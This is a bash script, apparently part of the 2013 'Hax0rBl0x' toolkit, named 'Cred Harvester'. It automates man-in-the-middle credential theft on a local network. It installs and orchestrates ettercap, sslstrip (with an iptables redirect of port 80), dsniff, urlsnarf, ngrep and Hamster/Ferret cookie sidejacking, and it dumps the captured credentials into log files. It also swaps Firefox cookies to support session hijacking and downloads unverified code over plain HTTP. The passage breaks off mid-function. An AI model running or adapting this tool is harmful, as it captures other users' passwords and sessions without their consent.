#!/bin/bash
#NAME=Cred Harvester

#	Hax0rBl0x - 40_Cred_Harvester.sh
#	Copyright (C) 2013  Dopey and ShadowBlade72
	VERSION="1.4"
#
#	This program is free software: you can redistribute it and/or modify
#	it under the terms of the GNU General Public License as published by
#	the Free Software Foundation, either version 3 of the License, or
#	(at your option) any later version.
#
#	This program is distributed in the hope that it will be useful,
#	but WITHOUT ANY WARRANTY; without even the implied warranty of
#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#	GNU General Public License for more details.
#
#	You should have received a copy of the GNU General Public License
#	along with this program.  If not, see <http://www.gnu.org/licenses/>.

#	Notice: If you already have hamster installed, it will report that it is not.
#	This is intentional. There are a lot of versions of Hamster and Ferret that do
#	not run properly on 64 bit. We just assume yours is broken and reinstall it.

##### EDIT BELOW THIS LINE ######

SSLSTRIP_Location="/pentest/web/sslstrip/sslstrip.py"
Hamster_Ferret_Location="/pentest/sniffers/hamster"
Final_Log="$HOME/Hax0rBl0x/Logs/CH_Output_`date +%d%b%y:%H%M`.txt"
SSL_Definitions="$HOME/Hax0rBl0x/definitions.sslstrip"
Browser=1 #Set to 1 to check for Firefox. 0 to disable check (for use with the Pi)
Flush_Cookies=1 #Set to 1 to automatically delete and restore cookies. 0 to disable feature
Logging=2 # 0=Off 1=Creds only (no repeats, URLSnarf full dump) 2=Full dumps of log files
AutoRestart=1

#Color Vars
Frame_Color=1
Splat_Color=3
Number_Color=3
Title_Color=7
Line_Color=4

##### EDIT ABOVE THIS LINE ######

control_c()
{
	tput reset; tput civis;
	current_line=4
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|$(tput setaf $Splat_Color) * * * * * * * * * * * $(tput setaf $Title_Color)Cred Harvester Terminating$(tput setaf $Splat_Color) * * * * * * * * * * * * $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	count=0
	while [[ $count -ne 16 ]]; do
		echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
		((count++))
	done
	unset count
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	if [[ $Logging -ge 2  && $Started -eq 1 ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Dumping logs into final report$(tput setaf $Line_Color) - - - - - - - - - - - - - - -\c"
		if [[ -f $Ettercap_Passive_Log ]]; then
			echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Ettercap Dump ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" >> $Final_Log
			etterlog -p $Ettercap_Passive_Log >> $Final_Log 2>&1
		fi
		if [[ -f $tempssllog && $SSLStrip_PID ]]; then	
			echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SSLStrip Dump ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" >> $Final_Log
			cat $tempssllog >> $Final_Log
		fi
		if [[ -f $tempdsnifflog && $Dsniff_PID ]]; then
			echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Dsniff Dump ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" >> $Final_Log
			dsniff -r $tempdsnifflog >> $Final_Log
		fi
		if [[ -f $tempngreplog && $NGREP_PID ]]; then
			echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ NGREP Dump ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" >> $Final_Log
			cat $tempngreplog >> $Final_Log
		fi
		if [[ -f $tempurlsnarflog && $URLSnarf_PID ]]; then
			echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ URLSnarf Dump ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" >> $Final_Log
			cat $tempurlsnarflog >> $Final_Log
		fi
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi
	if [[ $Ettercap_PID && $Hax -eq 1 ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Cleaning up Ettercap$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - -\c"
		PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "ettercap" | grep -i "\-l $Modified_Ettercap_Passive_Log" | awk '{ print $2 }'`
		if [[ "$PID" && "$PID" == "$Ettercap_PID" ]]; then
			kill -9 $Ettercap_PID >/dev/null 2>&1
		fi
		unset PID
		if [[ -f $Ettercap_Passive_Log ]]; then
			rm $Ettercap_Passive_Log
		fi
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi  	
	if [[ $SSLStrip_PID ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Cleaning up SSLStrip$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - -\c"
		PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "python $SSLSTRIP_Location -p -f -k -w $tempssllog" | awk '{ print $2 }'`
		if [[ "$PID" && "$PID" == "$SSLStrip_PID" ]]; then
			kill -9 $SSLStrip_PID >/dev/null 2>&1 &
		fi
		unset PID
		if [[ -f $tempssllog ]]; then
			rm $tempssllog
		fi
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi
	if [[ $IPTables && $IPTables -eq 1 ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Cleaning up IPTables and restoring ip_forwarding$(tput setaf $Line_Color) - - - - - -\c"
		iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 >/dev/null 2>&1
		echo "$IPF_Initial" > /proc/sys/net/ipv4/ip_forward
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi
	if [[ $Dsniff_PID ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Cleaning up Dsniff$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - - -\c"
		PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "dsniff" | awk '{ print $2 }'`
		if [[ "$PID" && "$PID" == "$Dsniff_PID" ]]; then
			kill -9 $Dsniff_PID >/dev/null 2>&1
		fi
		unset PID
		if [[ -f $tempdsnifflog ]]; then
			rm $tempdsnifflog
		fi
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi
	if [[ $Ferret_PID ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Terminating Ferret$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - - -\c"
		PID=`ps -ef | grep -v grep | grep -v xterm | grep -v firefox | grep -v ferret | grep -i "hamster" | awk '{ print $2 }'`
		if [[ "$PID" && "$PID" == "$Ferret_PID" ]]; then
			kill $Ferret_PID >/dev/null 2>&1
		fi
		unset PID
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi
	if [[ $Hamster_PID ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Terminating Hamster$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - - \c"
		PID=`ps -ef | grep -v grep | grep -v xterm | grep -v firefox | grep -v ferret | grep -i "hamster" | awk '{ print $2 }'`
		if [[ "$PID" && "$PID" == "$Hamster_PID" ]]; then
			kill $Hamster_PID >/dev/null 2>&1
		fi
		unset PID
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi
	if [[ $found_cookie && $found_cookie -eq 1 ]]; then
		firefox=0
		PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "firefox" | awk '{ print $2 }'`
		if [[ "$PID" ]]; then
			tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Firefox still running. Killing Firefox$(tput setaf $Line_Color) - - - - - - - - - - - \c"
			firefox=1
			PIDS=( $PID )
			Num_PIDS="${#PIDS[@]}"
			count=0
			while [[ $count -ne $Num_PIDS ]]; do
				kill -9 ${PIDS[$count]} >/dev/null 2>&1
				((count++))
			done
			unset count PID PIDS
			sleep 3
			PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "firefox" | awk '{ print $2 }'`
			if [[ ! "$PID" ]]; then
				echo "$(tput setaf 2)Success$(tput sgr0)"
				firefox=0
			else
				echo "$(tput setaf 1)-Failed$(tput sgr0)"
				rm $cookies_backup
			fi
			unset PID PIDS Num_PIDS
			((current_line++))
		fi
		if [[ $firefox -eq 0 ]]; then
			tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Restoring Cookies$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - - - -\c"
			mv $cookies_backup $cookies
			rc=$?
			if [[ $rc -eq 0 ]]; then
				echo "$(tput setaf 2)Success$(tput sgr0)"
			else
				echo "$(tput setaf 1) Failed$(tput sgr0)"
			fi
			((current_line++))
		fi
		unset firefox
	fi
	if [[ $NGREP_PID ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Cleaning up NGREP$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - - - \c"
		PID=`ps -ef | grep -v -w grep | grep -v xterm | grep -v -w watch | grep -i "ngrep" | awk '{print $2}'`
		if [[ "$PID" && "$PID" == "$NGREP_PID" ]]; then
			kill -9 $NGREP_PID >/dev/null 2>&1
		fi
		unset PID
		if [[ -f $tempngreplog ]]; then
			rm $tempngreplog
		fi
		if [[ -f $tempngreppcap ]]; then
			rm $tempngreppcap
		fi
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi
	if [[ $URLSnarf_PID ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Cleaning up URLSnarf$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - -\c"
		PID=`pgrep -f "urlsnarf"`
		if [[ "$PID" && "$PID" == "$URLSnarf_PID" ]]; then
			kill -9 $URLSnarf_PID >/dev/null 2>&1
		fi
		unset PID
		if [[ -f $tempurlsnarflog ]]; then
			rm $tempurlsnarflog
		fi
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi
	if [[ $http_proxy || $HTTP_PROXY ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Removing HTTP Proxy$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - - \c"
		export http_proxy=''
		export HTTP_PROXY=''
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi
	if [[ -f /tmp/targets ]]; then
		tput cup $current_line 2; echo -e "$(tput setaf 2)[+]$(tput sgr0) $(tput setaf 7)Removing Target Hosts File$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - -\c"
		rm /tmp/targets
		echo "$(tput setaf 2)Complete$(tput sgr0)"
		((current_line++))
	fi
	if [[ `pgrep Hax0rBl0x` ]]; then
		tput cup 20 2; echo "$(tput setaf 7)Returning to the main menu...$(tput sgr0)"
		sleep 1
	else
		tput cup 20 2; echo "$(tput setaf 7)Exiting the script...$(tput sgr0)"
		sleep 1
	fi
	tput cup 23 0; tput cnorm
	exit
}

#Trap keyboard interrupt (control-c)
trap control_c SIGINT

#VARIABLES
declare -a Captured_Creds PIDS All_Interfaces Sites Sites_Detail EGREP_Array EGREP_Invert_Array URLSnarf_Array NGREP_Array
tempssllog="/tmp/.tempssllog.txt"
tempdsnifflog="/tmp/.tempdsnifflog.txt"
tempngreplog="/tmp/.tempngreplog.txt"
tempngreppcap="/tmp/.tempngreppcap.pcap"
Ettercap_Passive_Log="/tmp/.passive_ettercap_data.eci"
Modified_Ettercap_Passive_Log="/tmp/.passive_ettercap_data"
tempurlsnarflog="/tmp/.tempurlsnarflog.txt"
cookies_backup="$HOME/.tempcookies.sqlite"
Final_Log_Clean=`awk -F"/" 'OFS="/" {gsub (/.*/,"",$NF); print}' <<< $Final_Log`
SSLDefintions_Clean=`awk -F"/" 'OFS="/" {gsub (/.*/,"",$NF); print}' <<< $SSL_Definitions`
check=0
IPF_Initial=`cat /proc/sys/net/ipv4/ip_forward`
SSLStrip=1
Dsniff=1
HandF=0
NGREP=0 #MUST REMAIN 0!
NGREP_Display=0
URLSnarf=0
URLSnarf_Filter=0
IPTables=0
SSLStrip_Running=1
Dsniff_Running=1
Ferret_Running=1
Hamster_Running=1
Ettercap_Running=1
NGREP_Running=1
URLSnarf_Running=1
Started=0
found_cookie=0
MainMenuLength=17
SanityMenuLength=18

#Checking if using Hax0rBl0x and setting Ettercap Accordingly
if [[ $(pgrep Hax0rBl0x) ]]; then
	Ettercap=1
	Hax=1
else
	Ettercap=0
	Hax=0
fi

#Checking if we can use XTerm or if we need to use Screen
if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
	Use_XTERM=0
else
	Use_XTERM=1
fi

#Preloading Sites
Sites=( `cat $SSL_Definitions 2>/dev/null | awk '{print $1}'` )
Number_Sites=$((${#Sites[@]}-1))
Sites_Detail=( `cat $SSL_Definitions 2>/dev/null | awk '{print $2}'` )

#Grabbing all wireless interfaces
All_Interfaces=( `ip link show | awk -F: '/^[0-9]/ {print $2}'` )
Number_Interfaces="${#All_Interfaces[@]}"

#SANITY VARIABLES
EtterSanity=0
PythonSanity=0
GawkSanity=0
SSLStripSanity=0
SSLStripDefinitionsSanity=0
SSLDefVersionSanity=0
DSniffSanity=0
HandFSanity=0
NGrepSanity=0
URLSnarfSanity=0
LogSanity=0
VersionLocation="http://pastebin.com/raw.php?i=NK59RrTd"

#SANITY MENU
fnSanityMenu() {
	tput civis
	clear
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|$(tput setaf $Splat_Color) * * * * * * * * * * * $(tput setaf $Title_Color)Cred Harvester Sanity Menu$(tput setaf $Splat_Color) * * * * * * * * * * * * $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[1]  $(tput setaf 7)Ettercap is currently$(tput setaf $Line_Color) - - - - - - - - - - - - - - - -\c"
	if [[ $EtterSanity -eq 1 ]]; then
		echo " $(tput setaf 1)Not Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " - - $(tput setaf 2)Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[2]  $(tput setaf 7)SSLStrip is currently$(tput setaf $Line_Color) - - - - - - - - - - - - - - - -\c"
	if [[ $SSLStripSanity -eq 1 ]]; then
		echo " $(tput setaf 1)Not Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " - - $(tput setaf 2)Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[3]  $(tput setaf 7)SSLStrip definitions$(tput setaf $Line_Color)- - - - - - - - - - - - - - - - - - -\c"
	if [[ $SSLStripDefinitionsSanity -eq 1 ]]; then
		echo " $(tput setaf 1)Not Found$(tput setaf $Frame_Color) |$(tput sgr0)"
	elif [[ $SSLDefVersionSanity -eq 1 ]]; then
		echo " $(tput setaf 1) Outdated$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " - - $(tput setaf 2)Found$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[4]  $(tput setaf 7)DSniff is currently$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - -\c"
	if [[ $DSniffSanity -eq 1 ]]; then
		echo " $(tput setaf 1)Not Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " - - $(tput setaf 2)Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[5]  $(tput setaf 7)Hamster & Ferret (Sidejacking) is currently$(tput setaf $Line_Color) - - - - -\c"
	if [[ $HandFSanity -eq 1 ]]; then
		echo " $(tput setaf 1)Not Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " - - $(tput setaf 2)Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[6]  $(tput setaf 7)NGREP is currently$(tput setaf $Line_Color)- - - - - - - - - - - - - - - - - -\c"
	if [[ $NGrepSanity -eq 1 ]]; then
		echo " $(tput setaf 1)Not Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " - - $(tput setaf 2)Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[7]  $(tput setaf 7)URLSnarf is currently$(tput setaf $Line_Color) - - - - - - - - - - - - - - - -\c"
	if [[ $URLSnarfSanity -eq 1 ]]; then
		echo " $(tput setaf 1)Not Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " - - $(tput setaf 2)Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[8]  $(tput setaf 7)Python is currently$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - -\c"
	if [[ $PythonSanity -eq 1 ]]; then
		echo " $(tput setaf 1)Not Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " - - $(tput setaf 2)Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[9]  $(tput setaf 7)Gawk is currently$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - -\c"
	if [[ $GawkSanity -eq 1 ]]; then
		echo " $(tput setaf 1)Not Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " - - $(tput setaf 2)Installed$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[10] $(tput setaf 7)Log directory$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - - - -\c"
	if [[ $LogSanity -eq 1 ]]; then
		echo " $(tput setaf 1)Not Found$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " - - $(tput setaf 2)Found$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[11] $(tput setaf 7)Version Check$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - - - \c"
	if [[ $VerSanity -eq 1 ]]; then
		echo " - $(tput setaf 1)Outdated$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " $(tput setaf 2)Up to date$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
	echo -e "$(tput setaf $Frame_Color)|              $(tput setaf $Number_Color)[Q] $(tput setaf 7)Quit             $(tput setaf $Frame_Color)|             $(tput setaf $Number_Color)[X] $(tput setaf 7)Override             $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	while :; do
	tput cnorm; tput cup 18 0; tput ed; tput cup 18 0
	echo -n "Enter your menu choice: "
	read yourch
	yourch=`tr '[:upper:]' '[:lower:]' <<<$yourch`
	case $yourch in
	1) if [[ $EtterSanity -eq 1 ]]; then fnEtterInstall; fi ;;
	2) if [[ $SSLStripSanity -eq 1 ]]; then fnSSLStripInstall; fi ;;
	3) if [[ $SSLStripDefinitionsSanity -eq 1 || $SSLDefVersionSanity -eq 1 ]]; then fnSSLStripDefinitionsInstall; fi ;;
	4) if [[ $DSniffSanity -eq 1 ]]; then fnDSniffInstall; fi ;;
	5) if [[ $HandFSanity -eq 1 ]]; then fnHandFInstall; fi ;;
	6) if [[ $NGrepSanity -eq 1 ]]; then fnNGrepInstall; fi ;;
	7) if [[ $URLSnarfSanity -eq 1 ]]; then fnURLSnarfInstall; fi ;;
	8) if [[ $PythonSanity -eq 1 ]]; then fnPythonInstall; fi ;;
	9) if [[ $GawkSanity -eq 1 ]]; then fnGawkInstall; fi ;;
	10) if [[ $LogSanity -eq 1 ]]; then fnLogInstall; fi ;;
	11) if [[ $VerSanity -eq 1 ]]; then fnUpdate; fi ;;
	x) if [[ $PythonSanity -eq 0 && $GawkSanity -eq 0 ]]; then fnOverride; else echo -e "$(tput setaf 1)[-]$(tput sgr0)Python and Gawk MUST be installed to continue."; fi ;;
	q) control_c ;;
	*) tput civis; tput cup 18 0; echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-]$(tput sgr0) Please make a valid selection!                                       $(tput setaf $Frame_Color)|$(tput sgr0)"; echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"; sleep 3 ;;
	esac
	done
}

fnOverride() {
tput civis; tput cup 18 0; tput cup ed; tput cup 18 0
echo "$(tput setaf $Frame_Color)|$(tput setaf 1)WARNING: ATTEMPTING TO USE TOOLS WHICH ARE NOT INSTALLED MAY CAUSE ERRORS!$(tput setaf $Frame_Color)|$(tput sgr0)"
echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
sleep 3
fnSel_Interface
}

#SANITY CHECKS
fnSanityRoot() {
	if [[ $UID -eq "0" ]]; then
		fnSanityProgs
	else
		echo -e "\nMust be root to run this script!"
		sleep 3
		control_c
	fi
}

fnSanityProgs() {
	if [[ ! -e `which ettercap 2>/dev/null` ]]; then
		EtterSanity=1
	fi
	if [[ ! -e $SSLSTRIP_Location ]]; then
		if [[ -e `which sslstrip 2>/dev/null` ]]; then
			SSLSTRIP_Location=`which sslstrip`
		else
			SSLStripSanity=1
		fi
	fi
	if [[ ! -e $SSL_Definitions ]]; then
		SSLStripDefinitionsSanity=1
	fi
	if [[ ! -e `which dsniff 2>/dev/null` ]]; then
		DSniffSanity=1
	fi
	if [[ ! -e $Hamster_Ferret_Location || ! -e $Hamster_Ferret_Location/.installcheck ]]; then
		HandFSanity=1
	fi
	if [[ ! -e `which ngrep 2>/dev/null` ]]; then
		NGrepSanity=1
	fi
	if [[ ! -e `which urlsnarf 2>/dev/null` ]]; then
		URLSnarfSanity=1
	fi
	if [[ ! -e `which python 2>/dev/null` ]]; then
		PythonSanity=1
	fi
	if [[ ! -e `which gawk 2>/dev/null` ]]; then
		GawkSanity=1
	fi
	if [[ ! -d $Final_Log_Clean ]]; then
		LogSanity=1
	fi
	VersionCheck=`curl -s $VersionLocation | grep -w CredHarvester | awk -F"=" '{ gsub (/\.|[[:space:]]/,"",$2); print $2}'`
	VersionCurrent=`awk '{ gsub (/\./,"",$1); print $1 }' <<< $VERSION`
	DefVersionCheck=`curl -s $VersionLocation | grep -w SSLStripDefinitions | awk -F"=" '{ gsub (/\.|[[:space:]]/,"",$2); print $2}'`
	DefVersionCurrent=`tail -n1 $SSL_Definitions 2>/dev/null | awk -F'[ =]' '{ gsub (/\.|[[:alpha:]]/,"",$4); print $4 }'`
	if [[ $VersionCheck -gt $VersionCurrent ]]; then
		VerSanity=1
	fi
	if [[ $DefVersionCheck -gt $DefVersionCurrent ]]; then
		SSLDefVersionSanity=1
	fi
	if [[ $SSLDefVersionSanity -eq 1 || $VerSanity -eq 1 || $LogSanity -eq 1 || $EtterSanity -eq 1 || $SSLStripSanity -eq 1 || $SSLStripDefinitionsSanity -eq 1 || $DSniffSanity -eq 1 || $HandFSanity -eq 1 || $NGrepSanity -eq 1 || $URLSnarfSanity -eq 1 || $PythonSanity -eq 1 || $GawkSanity -eq 1 ]]; then
		fnSanityMenu
	else
		fnSel_Interface
	fi
}

#SANITY INSTALL FUNCTIONS
fnEtterInstall() {
	tput civis; tput cup $SanityMenuLength 0;
	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing Ettercap.... Please wait...                               $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	apt-get install -y ettercap-graphical
	EtterSanity=0
	fnSanityProgs
}

fnSSLStripInstall() {
	tput civis; tput cup $SanityMenuLength 0;
	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing SSLStrip.... Please wait...                               $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	apt-get install -y sslstrip
	SSLStripSanity=0
	fnSanityProgs
}

fnSSLStripDefinitionsInstall() {
	DefVersionCheck=`curl -s $VersionLocation | grep -w SSLStripDefinitions | awk -F"=" '{ gsub (/[[:space:]]/,"",$2); print $2}'`
	tput civis; tput cup $SanityMenuLength 0;
	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing SSLStrip Definitions.... Please wait...                   $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	if [[ ! -e $SSLDefintions_Clean ]]; then
		mkdir -p $SSLDefintions_Clean
	fi
	wget -q -O $SSL_Definitions.tmp http://hax0rbl0x.googlecode.com/files/definitions.sslstrip_$DefVersionCheck
	rc=$?
	if [[ $rc -eq 0 ]]; then
		mv $SSL_Definitions.tmp $SSL_Definitions
	else
		rm $SSL_Definitions.tmp
		tput civis; tput cup $SanityMenuLength 0;
		echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-] $(tput sgr0)Could not download file... Please check your internet connection...  $(tput setaf $Frame_Color)|$(tput sgr0)"
		sleep 3
	fi
	SSLDefVersionSanity=0
	SSLStripDefinitionsSanity=0
	fnSanityProgs
}

fnDSniffInstall() {
	tput civis; tput cup $SanityMenuLength 0;
	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing DSniff.... Please wait...                                 $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	apt-get install -y dsniff
	DSniffSanity=0
	fnSanityProgs
}

fnHandFInstall() {
	tput civis; tput cup $SanityMenuLength 0;
	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing Hampster and Ferret.... Please wait...                    $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	cd /tmp
	wget -q http://hax0rbl0x.googlecode.com/files/HamFer20.tar
	rc=$?
	if [[ $rc -eq 0 && -e /tmp/HamFer20.tar ]]; then
		if [[ -d $Hamster_Ferret_Location/ ]]; then
			tput cup $SanityMenuLength 0;
			echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Found an existing copy of Hamster... Backing it up...                $(tput setaf $Frame_Color)|$(tput sgr0)"
			mv $Hamster_Ferret_Location/ $Hamster_Ferret_Location.bak/
			mkdir -p $Hamster_Ferret_Location
		else
			mkdir -p $Hamster_Ferret_Location
		fi
		apt-get install -y libpcap-dev > /dev/null 2>&1
		tar -xf HamFer20.tar
		cd /tmp/hamster/build/gcc4/
		tput cup $SanityMenuLength 0;
		echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing Hampster and Ferret.... Building Hamster...               $(tput setaf $Frame_Color)|$(tput sgr0)"
		make > /dev/null 2>&1
		mv /tmp/hamster/bin/* $Hamster_Ferret_Location/
		cd /tmp/ferret/build/gcc4/
		tput cup $SanityMenuLength 0;
		echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing Hampster and Ferret.... Building Ferret...                $(tput setaf $Frame_Color)|$(tput sgr0)"
		make > /dev/null 2>&1
		tput cup $SanityMenuLength 0;
		echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing Hampster and Ferret.... Please wait...                    $(tput setaf $Frame_Color)|$(tput sgr0)"
		mv /tmp/ferret/bin/* $Hamster_Ferret_Location/
		rm -R /tmp/ferret/ /tmp/hamster/ /tmp/HamFer20.tar
		cd
		touch $Hamster_Ferret_Location/.installcheck
	else
		tput civis; tput cup $SanityMenuLength 0;
		echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-] $(tput sgr0)Could not download file... Please check your internet connection...  $(tput setaf $Frame_Color)|$(tput sgr0)"
		sleep 3
	fi
	HandFSanity=0
	fnSanityProgs
}

fnNGrepInstall() {
	tput civis; tput cup $SanityMenuLength 0;
	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing NGREP.... Please wait...                                  $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	apt-get install -y ngrep
	NGrepSanity=0
	fnSanityProgs
}

fnURLSnarfInstall() {
	tput civis; tput cup $SanityMenuLength 0;
